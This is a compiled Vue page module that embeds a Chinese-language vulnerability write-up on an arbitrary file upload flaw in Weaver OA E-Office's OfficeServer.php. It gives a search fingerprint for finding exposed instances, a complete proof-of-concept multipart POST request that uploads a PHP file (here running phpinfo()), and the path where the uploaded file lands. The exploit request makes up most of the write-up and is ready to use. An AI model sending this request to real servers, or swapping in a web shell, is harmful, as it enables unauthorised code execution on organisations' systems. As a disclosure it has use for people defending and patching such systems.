import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const d={},t=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>泛微OA E-Office OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>泛微OA E-Office
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;eoffice10&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210081025897.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 990
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36

------WebKitFormBoundaryLpoiBFy4ANA8daew
Content-Disposition: form-data;name=&quot;FileData&quot;;filename=&quot;test.php&quot;
Content-Type: application/octet-stream

&lt;?php
phpinfo();
?&gt;

------WebKitFormBoundaryLpoiBFy4ANA8daew
Content-Disposition: form-data;name=&quot;FormData&quot;

{&#39;USERNAME&#39;:&#39;admin&#39;,&#39;RECORDID&#39;:&#39;undefined&#39;,&#39;OPTION&#39;:&#39;SAVEFILE&#39;,&#39;FILENAME&#39;:&#39;test.php&#39;}
------WebKitFormBoundaryLpoiBFy4ANA8daew--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210081026579.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>文件上传位置</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/eoffice10/server/public/iWebOffice2015/Document/test.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210081026917.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),s=[t];function l(r,c){return i(),n("div",null,s)}const p=e(d,[["render",l],["__file","泛微OA E-Office OfficeServer.php 任意文件上传漏洞.html.vue"]]);export{p as default};
